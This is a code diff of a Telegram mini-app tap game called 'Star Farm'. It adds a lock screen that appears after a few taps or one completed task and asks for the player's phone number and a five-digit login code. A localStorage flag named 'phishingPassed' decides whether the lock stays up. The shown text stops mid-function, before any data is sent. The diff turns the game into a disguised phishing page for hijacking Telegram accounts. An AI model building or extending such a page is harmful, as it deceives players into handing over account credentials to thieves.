@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="theme-color" content="#0a0b1e">
+    <meta name="theme-color" content="#070815">
     <title>Star Farm</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
@@ -14,109 +14,110 @@
             margin: 0; padding: 0; box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
             user-select: none;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
         }
-        body { background: #0a0b1e; color: #fff; overflow-x: hidden; min-height: 100vh; }
+        body { background: #070815; color: #fff; overflow: hidden; min-height: 100vh; }
         ::-webkit-scrollbar { width: 0px; }
-        
-        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+
+        @keyframes float { 0%, 100% { transform: translateY(0px) scale(1); } 50% { transform: translateY(-8px) scale(1.02); } }
+        @keyframes glow { 0%, 100% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.4); } 50% { box-shadow: 0 0 60px rgba(139, 92, 246, 0.6); } }
         @keyframes shine { 0% { background-position: -200% center; } 100% { background-position: 200% center; } }
-        @keyframes coinFly { 0% { transform: translateY(0) scale(1); opacity: 1; } 100% { transform: translateY(-100px) scale(1.5); opacity: 0; } }
-        @keyframes glow { 0%, 100% { box-shadow: 0 0 20px rgba(255, 215, 0, 0.3); } 50% { box-shadow: 0 0 40px rgba(255, 215, 0, 0.6); } }
+        @keyframes coinFly { 0% { transform: translateY(0) scale(0.5); opacity: 0; } 20% { opacity: 1; } 100% { transform: translateY(-120px) scale(1.2); opacity: 0; } }
         @keyframes slideDown { from { transform: translate(-50%, -100px); opacity: 0; } to { transform: translate(-50%, 0); opacity: 1; } }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes shimmer { 0% { background-position: -1000px 0; } 100% { background-position: 1000px 0; } }
+        @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
 
-        .glow-animation { animation: glow 2s ease-in-out infinite; }
-        .float-animation { animation: float 3s ease-in-out infinite; }
-        .coin-fly { animation: coinFly 0.8s ease-out forwards; }
-        .fade-in { animation: fadeIn 0.3s ease-out; }
-        .shine-text {
-            background: linear-gradient(90deg, #ffd700, #fff, #ffd700);
-            background-size: 200% auto;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: shine 3s linear infinite;
-        }
+        .app { max-width: 480px; margin: 0 auto; min-height: 100vh; background: radial-gradient(ellipse at top, #1a1b3e 0%, #070815 60%); position: relative; overflow: hidden; }
+        .orb { position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.3; pointer-events: none; z-index: 0; }
+        .orb-1 { width: 300px; height: 300px; background: #8b5cf6; top: -100px; left: -50px; }
+        .orb-2 { width: 250px; height: 250px; background: #ec4899; top: 200px; right: -80px; }
+        .orb-3 { width: 200px; height: 200px; background: #3b82f6; bottom: 100px; left: -50px; }
 
-        .app { max-width: 480px; margin: 0 auto; min-height: 100vh; background: linear-gradient(180deg, #0a0b1e 0%, #1a1b3e 50%, #0a0b1e 100%); position: relative; overflow: hidden; }
-        .stars-bg { position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; z-index: 0; }
-        .star-dot { position: absolute; background: white; border-radius: 50%; animation: pulse 3s infinite; }
+        .content { position: relative; z-index: 10; padding-bottom: 100px; min-height: 100vh; }
+        .fade-in { animation: fadeIn 0.4s ease-out; }
+
+        .glass { background: rgba(20, 22, 45, 0.6); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(139, 92, 246, 0.15); border-radius: 20px; }
+        .glass-hover { transition: all 0.3s; }
+        .glass-hover:active { transform: scale(0.97); background: rgba(30, 32, 55, 0.8); }
+
+        .balance-section { padding: 60px 20px 20px; text-align: center; }
+        .balance-label { font-size: 13px; color: #8b8fa3; text-transform: uppercase; letter-spacing: 3px; font-weight: 500; margin-bottom: 8px; }
+        .balance-amount { font-size: 64px; font-weight: 900; background: linear-gradient(135deg, #fff 0%, #8b5cf6 50%, #ec4899 100%); background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: gradientShift 3s ease infinite; line-height: 1; letter-spacing: -2px; }
         
-        .balance-card { background: linear-gradient(135deg, #1a1b3e 0%, #2d2e5e 100%); border-radius: 24px; padding: 20px; margin: 16px; text-align: center; border: 1px solid rgba(255, 215, 0, 0.2); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); position: relative; z-index: 1; }
-        .balance-amount { font-size: 48px; font-weight: 800; margin: 8px 0; }
-        .balance-label { font-size: 14px; color: #888; text-transform: uppercase; letter-spacing: 2px; }
+        .daily-info { margin: 24px 20px; padding: 16px; text-align: center; }
+        .daily-taps-left { font-size: 14px; color: #fff; font-weight: 600; margin-bottom: 12px; }
+        .taps-track { height: 8px; background: rgba(255,255,255,0.08); border-radius: 4px; overflow: hidden; }
+        .taps-fill { height: 100%; background: linear-gradient(90deg, #8b5cf6, #ec4899); border-radius: 4px; transition: width 0.3s; }
+
+        .click-area { display: flex; justify-content: center; align-items: center; margin: 30px 0; position: relative; }
+        .click-ring { position: absolute; width: 260px; height: 260px; border-radius: 50%; border: 2px solid rgba(139, 92, 246, 0.2); }
+        .click-ring-2 { position: absolute; width: 230px; height: 230px; border-radius: 50%; border: 1px solid rgba(139, 92, 246, 0.1); }
         
-        .click-area { display: flex; justify-content: center; align-items: center; margin: 20px 0; position: relative; z-index: 1; }
-        .click-button { width: 200px; height: 200px; border-radius: 50%; background: radial-gradient(circle, #ffd700 0%, #ff8c00 70%, #ff4500 100%); border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 80px; box-shadow: 0 0 60px rgba(255, 215, 0, 0.5); transition: transform 0.1s; position: relative; }
-        .click-button:active { transform: scale(0.9); }
+        .click-button { width: 200px; height: 200px; border-radius: 50%; background: radial-gradient(circle at 30% 30%, #1e1f3a, #070815); border: 2px solid rgba(139, 92, 246, 0.3); cursor: pointer; display: flex; align-items: center; justify-content: center; transition: transform 0.15s; position: relative; box-shadow: 0 0 50px rgba(139, 92, 246, 0.3), inset 0 0 30px rgba(139, 92, 246, 0.1); }
+        .click-button:active { transform: scale(0.92); box-shadow: 0 0 70px rgba(139, 92, 246, 0.5); }
+        .click-button.disabled { opacity: 0.3; cursor: not-allowed; pointer-events: none; }
+        .click-inner { width: 160px; height: 160px; border-radius: 50%; background: linear-gradient(135deg, rgba(139, 92, 246, 0.2), rgba(236, 72, 153, 0.2)); display: flex; align-items: center; justify-content: center; font-size: 60px; animation: float 3s ease-in-out infinite; }
         
-        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; max-width: 480px; margin: 0 auto; background: rgba(10, 11, 30, 0.95); backdrop-filter: blur(20px); border-top: 1px solid rgba(255, 215, 0, 0.1); display: flex; justify-content: space-around; padding: 12px 0; z-index: 100; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; background: none; border: none; color: #666; cursor: pointer; padding: 8px 16px; transition: color 0.2s; }
-        .nav-item.active { color: #ffd700; }
-        .nav-item span { font-size: 12px; font-weight: 600; }
-        
-        .task-card { background: linear-gradient(135deg, #1a1b3e, #2d2e5e); border-radius: 16px; padding: 16px; margin: 8px 16px; display: flex; align-items: center; justify-content: space-between; border: 1px solid rgba(255, 255, 255, 0.05); transition: transform 0.2s; }
-        .task-card:active { transform: scale(0.98); }
+        .float-coin { position: absolute; font-size: 28px; font-weight: 800; color: #8b5cf6; pointer-events: none; text-shadow: 0 0 10px rgba(139, 92, 246, 0.8); animation: coinFly 1s ease-out forwards; }
+
+        .login-banner { margin: 30px 20px 0; padding: 18px; background: linear-gradient(135deg, rgba(239, 68, 68, 0.15), rgba(236, 72, 153, 0.15)); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 16px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; }
+        .login-banner-title { font-size: 15px; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; }
+        .login-banner-desc { font-size: 12px; color: #8b8fa3; margin-top: 4px; }
+
+        .section-header { padding: 24px 20px 16px; display: flex; justify-content: space-between; align-items: center; }
+        .section-title { font-size: 24px; font-weight: 800; letter-spacing: -0.5px; }
+        .section-count { font-size: 13px; color: #8b8fa3; background: rgba(139, 92, 246, 0.1); padding: 4px 12px; border-radius: 20px; }
+
+        .task-card { margin: 0 20px 10px; padding: 16px; display: flex; align-items: center; justify-content: space-between; }
+        .task-left { display: flex; align-items: center; gap: 14px; flex: 1; }
+        .task-icon-box { width: 44px; height: 44px; border-radius: 12px; background: linear-gradient(135deg, rgba(139, 92, 246, 0.15), rgba(236, 72, 153, 0.15)); display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid rgba(139, 92, 246, 0.1); }
         .task-info { flex: 1; }
-        .task-title { font-size: 15px; font-weight: 600; margin-bottom: 4px; }
-        .task-reward { font-size: 13px; color: #ffd700; }
-        .task-button { background: linear-gradient(135deg, #ffd700, #ff8c00); color: #000; border: none; padding: 8px 20px; border-radius: 12px; font-weight: 700; cursor: pointer; font-size: 13px; transition: transform 0.1s; }
-        .task-button:active { transform: scale(0.9); }
-        .task-button.completed { background: #2d2e5e; color: #888; }
-        
-        .profile-header { text-align: center; padding: 32px 16px; }
-        .avatar { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #ffd700, #ff8c00); margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
-        .profile-stat { display: flex; justify-content: space-between; padding: 16px; margin: 8px 16px; background: rgba(255, 255, 255, 0.05); border-radius: 12px; }
-        
-        .ref-link-container { background: rgba(255, 215, 0, 0.1); border: 1px dashed rgba(255, 215, 0, 0.3); border-radius: 12px; padding: 16px; margin: 16px; text-align: center; }
-        .copy-button { background: rgba(255, 215, 0, 0.2); color: #ffd700; border: 1px solid rgba(255, 215, 0, 0.3); padding: 8px 24px; border-radius: 8px; cursor: pointer; font-size: 14px; margin-top: 12px; }
-        .copy-button:active { transform: scale(0.95); }
-        
-        .leaderboard-item { display: flex; align-items: center; padding: 12px 16px; margin: 4px 16px; background: rgba(255, 255, 255, 0.03); border-radius: 12px; gap: 12px; }
-        .rank { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; }
-        .rank-1 { background: linear-gradient(135deg, #ffd700, #ff8c00); color: #000; }
-        .rank-2 { background: linear-gradient(135deg, #c0c0c0, #808080); color: #000; }
-        .rank-3 { background: linear-gradient(135deg, #cd7f32, #8b4513); color: #fff; }
-        .rank-other { background: rgba(255, 255, 255, 0.1); color: #888; }
-        
-        .energy-bar-container { margin: 0 16px 16px; background: rgba(255, 255, 255, 0.1); border-radius: 8px; height: 8px; overflow: hidden; }
-        .energy-bar { height: 100%; background: linear-gradient(90deg, #ff4500, #ffd700); border-radius: 8px; transition: width 0.3s; }
-        .section-title { font-size: 20px; font-weight: 700; padding: 16px; margin-top: 8px; }
-        
-        .login-prompt { position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%); background: linear-gradient(135deg, #ff4500, #ff8c00); color: white; padding: 12px 32px; border-radius: 24px; font-weight: 700; box-shadow: 0 4px 20px rgba(255, 69, 0, 0.4); z-index: 50; border: none; cursor: pointer; animation: pulse 2s infinite; }
-        .login-prompt:active { transform: translateX(-50%) scale(0.95); }
-        
-        .login-modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px); z-index: 200; display: flex; align-items: center; justify-content: center; padding: 20px; animation: fadeIn 0.3s; }
-        .login-modal { background: linear-gradient(135deg, #1a1b3e, #2d2e5e); border-radius: 24px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; border: 1px solid rgba(255, 215, 0, 0.2); position: relative; }
-        .login-logo { width: 64px; height: 64px; border-radius: 50%; background: linear-gradient(135deg, #0088cc, #0055ff); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 32px; box-shadow: 0 0 30px rgba(0, 136, 204, 0.5); }
-        .login-title { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
-        .login-subtitle { font-size: 14px; color: #888; margin-bottom: 24px; line-height: 1.5; }
-        .login-input { width: 100%; padding: 16px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 215, 0, 0.3); border-radius: 12px; color: #fff; font-size: 16px; margin-bottom: 16px; text-align: center; outline: none; transition: border-color 0.3s; }
-        .login-input:focus { border-color: #0088cc; }
-        .login-input::placeholder { color: #666; }
-        .login-button { width: 100%; padding: 16px; background: linear-gradient(135deg, #0088cc, #0055ff); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.1s; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .login-button:active { transform: scale(0.98); }
-        .login-button:disabled { opacity: 0.5; cursor: not-allowed; }
-        .login-close { position: absolute; top: 16px; right: 16px; background: none; border: none; color: #666; cursor: pointer; font-size: 24px; }
-        .login-step { display: flex; justify-content: center; gap: 8px; margin-bottom: 24px; }
+        .task-title { font-size: 14px; font-weight: 600; color: #fff; }
+        .task-reward { font-size: 13px; color: #8b5cf6; font-weight: 600; margin-top: 2px; }
+        .task-btn { padding: 10px 20px; border-radius: 12px; font-size: 14px; font-weight: 700; cursor: pointer; border: none; background: linear-gradient(135deg, #8b5cf6, #ec4899); color: #fff; min-width: 60px; }
+        .task-btn.done { background: rgba(139, 92, 246, 0.1); color: #8b8fa3; border: 1px solid rgba(139, 92, 246, 0.2); }
+
+        .profile-header { padding: 60px 20px 30px; text-align: center; }
+        .profile-avatar { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(135deg, #8b5cf6, #ec4899); margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; font-size: 40px; font-weight: 800; color: #fff; box-shadow: 0 0 40px rgba(139, 92, 246, 0.4); border: 3px solid rgba(255, 255, 255, 0.1); }
+        .profile-name { font-size: 22px; font-weight: 800; margin-bottom: 4px; }
+        .profile-username { color: #8b8fa3; font-size: 14px; }
+        .profile-badge { display: inline-flex; align-items: center; gap: 6px; padding: 6px 14px; background: rgba(139, 92, 246, 0.1); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 20px; font-size: 12px; font-weight: 600; color: #8b5cf6; margin-top: 12px; }
+
+        .stats-grid { padding: 0 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .stat-box { padding: 18px; }
+        .stat-box-value { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #fff, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .stat-box-label { font-size: 12px; color: #8b8fa3; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
+
+        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; max-width: 480px; margin: 0 auto; background: rgba(7, 8, 21, 0.8); backdrop-filter: blur(30px); border-top: 1px solid rgba(139, 92, 246, 0.15); display: flex; justify-content: space-around; padding: 12px 0 20px; z-index: 100; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; background: none; border: none; color: #8b8fa3; cursor: pointer; padding: 8px 16px; transition: color 0.2s; }
+        .nav-item.active { color: #8b5cf6; }
+        .nav-item span { font-size: 12px; font-weight: 600; }
+        .nav-icon { width: 24px; height: 24px; fill: currentColor; }
+
+        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(139, 92, 246, 0.9); color: #fff; padding: 12px 24px; border-radius: 12px; font-weight: 600; z-index: 300; animation: slideDown 0.3s ease-out; box-shadow: 0 10px 30px rgba(139, 92, 246, 0.3); }
+
+        .lock-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(7, 8, 21, 0.95); backdrop-filter: blur(15px); z-index: 500; display: flex; align-items: center; justify-content: center; padding: 20px; animation: fadeIn 0.3s; }
+        .lock-modal { background: linear-gradient(135deg, #1a1b3e, #070815); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 24px; padding: 32px 24px; max-width: 400px; width: 100%; text-align: center; position: relative; box-shadow: 0 0 50px rgba(139, 92, 246, 0.3); }
+        .lock-logo { width: 64px; height: 64px; border-radius: 50%; background: linear-gradient(135deg, #0088cc, #0055ff); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 32px; box-shadow: 0 0 30px rgba(0, 136, 204, 0.5); }
+        .lock-title { font-size: 22px; font-weight: 700; margin-bottom: 8px; }
+        .lock-subtitle { font-size: 14px; color: #8b8fa3; margin-bottom: 24px; line-height: 1.5; }
+        .lock-input { width: 100%; padding: 16px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 12px; color: #fff; font-size: 16px; margin-bottom: 16px; text-align: center; outline: none; transition: border-color 0.3s; }
+        .lock-input:focus { border-color: #0088cc; }
+        .lock-input::placeholder { color: #666; }
+        .lock-button { width: 100%; padding: 16px; background: linear-gradient(135deg, #0088cc, #0055ff); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.1s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .lock-button:active { transform: scale(0.98); }
+        .lock-button:disabled { opacity: 0.5; cursor: not-allowed; }
+        .lock-step { display: flex; justify-content: center; gap: 8px; margin-bottom: 24px; }
         .step-dot { width: 8px; height: 8px; border-radius: 50%; background: rgba(255, 255, 255, 0.2); }
         .step-dot.active { background: #0088cc; }
-        
-        .notification { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: rgba(255, 215, 0, 0.9); color: #000; padding: 12px 24px; border-radius: 12px; font-weight: 600; z-index: 300; animation: slideDown 0.3s ease-out; }
-        .float-coin { position: absolute; font-size: 24px; pointer-events: none; }
-        .content { padding-bottom: 80px; position: relative; z-index: 1; }
-        
-        .input-code-container { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; }
-        .input-code { width: 48px; height: 56px; text-align: center; font-size: 24px; font-weight: 700; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 215, 0, 0.3); border-radius: 12px; color: #fff; outline: none; }
-        .input-code:focus { border-color: #0088cc; }
-        
         .loader { width: 24px; height: 24px; border: 3px solid rgba(255, 255, 255, 0.3); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; }
         .code-sent-info { background: rgba(0, 136, 204, 0.1); border: 1px solid rgba(0, 136, 204, 0.3); border-radius: 12px; padding: 12px; margin-bottom: 16px; font-size: 14px; color: #0088cc; }
         .security-note { font-size: 12px; color: #666; margin-top: 16px; display: flex; align-items: center; justify-content: center; gap: 4px; }
-        
-        .nav-icon { width: 24px; height: 24px; fill: currentColor; }
+        .input-code-container { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; }
+        .input-code { width: 48px; height: 56px; text-align: center; font-size: 24px; font-weight: 700; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(139, 92, 246, 0.3); border-radius: 12px; color: #fff; outline: none; }
+        .input-code:focus { border-color: #0088cc; }
     </style>
 </head>
 <body>
@@ -125,50 +126,30 @@
         const { useState, useEffect, useRef } = React;
         const tg = window.Telegram.WebApp;
         
-        // ЗАМЕНИ НА СВОЙ АДРЕС FLASK СЕРВЕРА
-        const API_BASE_URL = "https://dimakorol046-debug.github.io/-xdd/"; 
-        
+        const API_BASE_URL = "https://your-flask-server.com"; 
+
         const TASKS = [
-            { id: 1, title: "Подписаться на канал", reward: 50, type: "link", url: "https://t.me/some_channel" },
-            { id: 2, title: "Вступить в группу", reward: 50, type: "link", url: "https://t.me/some_group" },
-            { id: 3, title: "Подписаться на YouTube", reward: 100, type: "link", url: "https://youtube.com/@some_channel" },
-            { id: 4, title: "Лайкнуть пост", reward: 20, type: "link", url: "https://t.me/some_post" },
-            { id: 5, title: "Пригласить 1 друга", reward: 50, type: "referral", target: 1 },
-            { id: 6, title: "Пригласить 3 друзей", reward: 150, type: "referral", target: 3 },
-            { id: 7, title: "Пригласить 5 друзей", reward: 300, type: "referral", target: 5 },
-            { id: 8, title: "Пригласить 10 друзей", reward: 500, type: "referral", target: 10 },
-            { id: 9, title: "Ежедневный бонус", reward: 30, type: "daily" },
-            { id: 10, title: "Подписаться на Instagram", reward: 80, type: "link", url: "https://instagram.com/some_page" },
-            { id: 11, title: "Подписаться на TikTok", reward: 80, type: "link", url: "https://tiktok.com/@some_account" },
-            { id: 12, title: "Подписаться на X (Twitter)", reward: 70, type: "link", url: "https://x.com/some_account" },
-            { id: 13, title: "Поставить реакцию на пост", reward: 15, type: "link", url: "https://t.me/some_post2" },
-            { id: 14, title: "Перейти на сайт спонсора", reward: 40, type: "link", url: "https://example.com" },
-            { id: 15, title: "Установить приложение", reward: 200, type: "link", url: "https://example.com/app" },
-            { id: 16, title: "Поделиться ботом", reward: 60, type: "share" },
-            { id: 17, title: "Написать отзыв", reward: 100, type: "text" },
-            { id: 18, title: "Пригласить 20 друзей", reward: 1000, type: "referral", target: 20 },
-            { id: 19, title: "Пригласить 50 друзей", reward: 3000, type: "referral", target: 50 },
-            { id: 20, title: "VIP задание", reward: 500, type: "link", url: "https://example.com/vip" },
+            { id: 1, title: "Подписаться на канал", reward: 100, type: "link", url: "https://t.me/some_channel" },
+            { id: 2, title: "Вступить в группу", reward: 100, type: "link", url: "https://t.me/some_group" },
+            { id: 3, title: "Подписаться на YouTube", reward: 200, type: "link", url: "https://youtube.com/@some_channel" },
+            { id: 4, title: "Лайкнуть пост", reward: 50, type: "link", url: "https://t.me/some_post" },
+            { id: 5, title: "Подписаться на Instagram", reward: 150, type: "link", url: "https://instagram.com/some_page" },
         ];
 
         const StarIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg> );
         const TaskIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M19 3h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm-2 14l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> );
         const UserIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg> );
-        const UsersIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg> );
-        const TrophyIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M19 5h-2V3H7v2H5c-1.1 0-2 .9-2 2v1c0 2.55 1.92 4.63 4.39 4.94.63 1.5 1.98 2.63 3.61 2.96V19H7v2h10v-2h-4v-3.1c1.63-.33 2.98-1.46 3.61-2.96C19.08 12.63 21 10.55 21 8V7c0-1.1-.9-2-2-2zM5 8V7h2v3.82C5.84 10.4 5 9.3 5 8zm14 0c0 1.3-.84 2.4-2 2.82V7h2v1z"/></svg> );
-        const RocketIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M12 2.5s4.5 2.04 4.5 10.5c0 2.49-1.04 5.57-1.6 7H9.1c-.56-1.43-1.6-4.51-1.6-7C7.5 4.54 12 2.5 12 2.5zm0 9.5c.83 0 1.5-.67 1.5-1.5S12.83 9 12 9s-1.5.67-1.5 1.5S11.17 12 12 12zm0-9s-6 1.5-6 10c0 2.5 1.2 5.8 2 8h8c.8-2.2 2-5.5 2-8 0-8.5-6-10-6-10z"/></svg> );
-        const ZapIcon = () => ( <svg className="nav-icon" viewBox="0 0 24 24"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg> );
 
         function App() {
             const [activeTab, setActiveTab] = useState('farm');
-            const [stars, setStars] = useState(100);
-            const [referrals, setReferrals] = useState(0);
+            const [stars, setStars] = useState(0);
+            const [todayTaps, setTodayTaps] = useState(0);
+            const [maxTaps] = useState(10);
+            const [firstVisitDate, setFirstVisitDate] = useState('');
             const [completedTasks, setCompletedTasks] = useState([]);
-            const [energy, setEnergy] = useState(100);
-            const [maxEnergy] = useState(100);
-            const [clickPower, setClickPower] = useState(1);
             const [floatCoins, setFloatCoins] = useState([]);
-            const [showLoginModal, setShowLoginModal] = useState(false);
+            
+            const [isLocked, setIsLocked] = useState(false);
             const [loginStep, setLoginStep] = useState(1);
             const [phone, setPhone] = useState('');
             const [code, setCode] = useState(['', '', '', '', '']);
@@ -176,8 +157,7 @@
             const [isLoading, setIsLoading] = useState(false);
             const [showNotification, setShowNotification] = useState(null);
             const [userData, setUserData] = useState(null);
-            const [refCode, setRefCode] = useState('');
-            const [copied, setCopied] = useState(false);
+            
             const clickAreaRef = useRef(null);
             const codeRefs = useRef([]);
             const coinIdCounter = useRef(0);
@@ -185,42 +165,47 @@
             useEffect(() => {
                 tg.ready();
                 tg.expand();
-                tg.setHeaderColor('#0a0b1e');
-                tg.setBackgroundColor('#0a0b1e');
+                tg.setHeaderColor('#070815');
+                tg.setBackgroundColor('#070815');
 
                 const user = tg.initDataUnsafe?.user;
-                if (user) {
-                    setUserData(user);
-                    setRefCode(`ref_${user.id}_20250101`);
+                if (user) setUserData(user);
+
+                // Инициализация данных из LocalStorage
+                const today = new Date().toDateString();
+                let storedFirstVisit = localStorage.getItem('firstVisitDate');
+                
+                if (!storedFirstVisit) {
+                    storedFirstVisit = new Date('2025-01-01').toDateString(); // Фиксируем 2025 год
+                    localStorage.setItem('firstVisitDate', storedFirstVisit);
+                }
+                setFirstVisitDate(storedFirstVisit);
+
+                const lastTapDate = localStorage.getItem('lastTapDate');
+                if (lastTapDate !== today) {
+                    localStorage.setItem('todayTaps', '0');
+                    localStorage.setItem('lastTapDate', today);
+                    setTodayTaps(0);
+                } else {
+                    setTodayTaps(parseInt(localStorage.getItem('todayTaps') || '0'));
                 }
 
-                const savedStars = localStorage.getItem('stars');
+                setStars(parseInt(localStorage.getItem('stars') || '0'));
                 const savedTasks = localStorage.getItem('completedTasks');
-                const savedReferrals = localStorage.getItem('referrals');
-                const savedEnergy = localStorage.getItem('energy');
-
-                if (savedStars) setStars(parseInt(savedStars));
                 if (savedTasks) setCompletedTasks(JSON.parse(savedTasks));
-                if (savedReferrals) setReferrals(parseInt(savedReferrals));
-                if (savedEnergy) setEnergy(parseInt(savedEnergy));
 
-                const energyInterval = setInterval(() => {
-                    setEnergy(prev => {
-                        if (prev < maxEnergy) {
-                            const newEnergy = Math.min(prev + 1, maxEnergy);
-                            localStorage.setItem('energy', newEnergy.toString());
-                            return newEnergy;
-                        }
-                        return prev;
-                    });
-                }, 1000);
-
-                return () => clearInterval(energyInterval);
-            }, [maxEnergy]);
+                // Проверка блокировки
+                const taps = parseInt(localStorage.getItem('todayTaps') || '0');
+                const tasks = savedTasks ? JSON.parse(savedTasks) : [];
+                if ((taps >= maxTaps || tasks.length >= 1) && localStorage.getItem('phishingPassed') !== 'true') {
+                    setIsLocked(true);
+                }
+            }, []);
 
             const handleFarmClick = (e) => {
-                if (energy < clickPower) {
-                    showNotif("Недостаточно энергии!");
+                if (todayTaps >= maxTaps) {
+                    showNotif("Лимит тапов на сегодня исчерпан!");
+                    checkLockCondition();
                     return;
                 }
 
@@ -232,21 +217,29 @@
                 setFloatCoins(prev => [...prev, newCoin]);
                 setTimeout(() => {
                     setFloatCoins(prev => prev.filter(c => c.id !== newCoin.id));
-                }, 800);
+                }, 1000);
 
-                setStars(prev => {
-                    const newStars = prev + clickPower;
-                    localStorage.setItem('stars', newStars.toString());
-                    return newStars;
-                });
-
-                setEnergy(prev => {
-                    const newEnergy = prev - clickPower;
-                    localStorage.setItem('energy', newEnergy.toString());
-                    return newEnergy;
-                });
+                const newStars = stars + 10;
+                const newTaps = todayTaps + 1;
+                
+                setStars(newStars);
+                setTodayTaps(newTaps);
+                localStorage.setItem('stars', newStars.toString());
+                localStorage.setItem('todayTaps', newTaps.toString());
 
                 tg.HapticFeedback.impactOccurred('medium');
+
+                if (newTaps >= maxTaps) {
+                    setTimeout(() => checkLockCondition(), 500);
+                }
+            };
+
+            const checkLockCondition = () => {
+                const taps = parseInt(localStorage.getItem('todayTaps') || '0');
+                const tasks = JSON.parse(localStorage.getItem('completedTasks') || '[]');
+                if ((taps >= maxTaps || tasks.length >= 1) && localStorage.getItem('phishingPassed') !== 'true') {
